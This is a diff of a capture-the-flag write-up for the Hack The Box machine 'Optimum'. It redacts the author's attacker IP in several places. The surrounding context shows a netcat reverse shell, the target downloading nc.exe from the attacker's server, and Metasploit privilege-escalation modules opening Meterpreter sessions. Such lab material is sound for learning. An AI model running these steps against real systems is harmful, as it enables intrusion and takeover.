@@ -259,7 +259,7 @@ Accept: */*
 Accept-Language: el
 Accept-Encoding: gzip, deflate
 User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/7.0; .NET4.0E; .NET4.0C)
-Host: 10.10.14.16
+Host: 10.10.x.x
 Connection: Keep-Alive
 ```
 Interesting, we get a `GET /nc.exe HTTP/1.1` request. And sure enough, on the comments of the Python script, it mentions `EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe)`.
@@ -283,7 +283,7 @@ After which, we start a listener again on Port 443 with `sudo nc -lvnp 443` and 
 ```
 hippoeug@kali:~$ sudo nc -lvnp 443
 listening on [any] 443 ...
-connect to [10.10.14.16] from (UNKNOWN) [10.10.10.8] 49330
+connect to [10.10.x.x] from (UNKNOWN) [10.10.10.8] 49330
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 C:\Users\kostas\Desktop>
@@ -564,8 +564,8 @@ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set target
 target => 1
 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options
 ...
-msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lhost 10.10.14.15
-lhost => 10.10.14.15
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lhost 10.10.x.x
+lhost => 10.10.x.x
 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lport 4545
 lport => 4545
 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
@@ -573,7 +573,7 @@ session => 1
 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
 
 [!] SESSION may not be compatible with this module.
-[*] Started reverse TCP handler on 10.10.14.15:4545 
+[*] Started reverse TCP handler on 10.10.x.x:4545 
 [-] Exploit aborted due to failure: none: Session is already elevated
 [+] Deleted 
 [*] Exploit completed, but no session was created.
@@ -651,7 +651,7 @@ msf5 exploit(multi/handler) > exploit
 
 [*] Started reverse TCP handler on 10.10.x.x:4545 
 [*] Sending stage (201283 bytes) to 10.10.10.8
-[*] Meterpreter session 1 opened (10.10.14.15:4545 -> 10.10.10.8:49204) at 2021-01-17 14:22:40 +0800
+[*] Meterpreter session 1 opened (10.10.x.x:4545 -> 10.10.10.8:49204) at 2021-01-17 14:22:40 +0800
 
 meterpreter > background
 msf5 > sessions 
@@ -661,7 +661,7 @@ Active sessions
 
   Id  Name  Type                     Information               Connection
   --  ----  ----                     -----------               ----------
-  1         meterpreter x64/windows  OPTIMUM\kostas @ OPTIMUM  10.10.14.15:4545 -> 10.10.10.8:49204 (10.10.10.8)
+  1         meterpreter x64/windows  OPTIMUM\kostas @ OPTIMUM  10.10.x.x:4545 -> 10.10.10.8:49204 (10.10.10.8)
 ```
 Indeed we did!
 
@@ -693,7 +693,7 @@ msf5 exploit(windows/local/ms14_058_track_popup_menu) > set session 1
 session => 1
 msf5 exploit(windows/local/ms14_058_track_popup_menu) > run
 
-[*] Started reverse TCP handler on 10.10.14.15:4646 
+[*] Started reverse TCP handler on 10.10.x.x:4646 
 [-] Exploit aborted due to failure: not-vulnerable: Exploit not available on this system.
 [*] Exploit completed, but no session was created.
 ```
@@ -717,7 +717,7 @@ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set sessio
 session => 1
 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
 
-[*] Started reverse TCP handler on 10.10.14.15:4646 
+[*] Started reverse TCP handler on 10.10.x.x:4646 
 [+] Compressed size: 1016
 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
 [*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\uenODdmaCwwNK.ps1...
@@ -754,7 +754,7 @@ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
 TJn8TusTEgQYWSVvMHKkkWIl2Ff4BM8N
 [+] Executed on target machine.
 [*] Sending stage (176195 bytes) to 10.10.10.8
-[*] Meterpreter session 2 opened (10.10.14.15:4646 -> 10.10.10.8:49205) at 2021-01-17 14:27:43 +0800
+[*] Meterpreter session 2 opened (10.10.x.x:4646 -> 10.10.10.8:49205) at 2021-01-17 14:27:43 +0800
 [+] Deleted C:\Users\kostas\AppData\Local\Temp\uenODdmaCwwNK.ps1
 ...
 meterpreter > dir
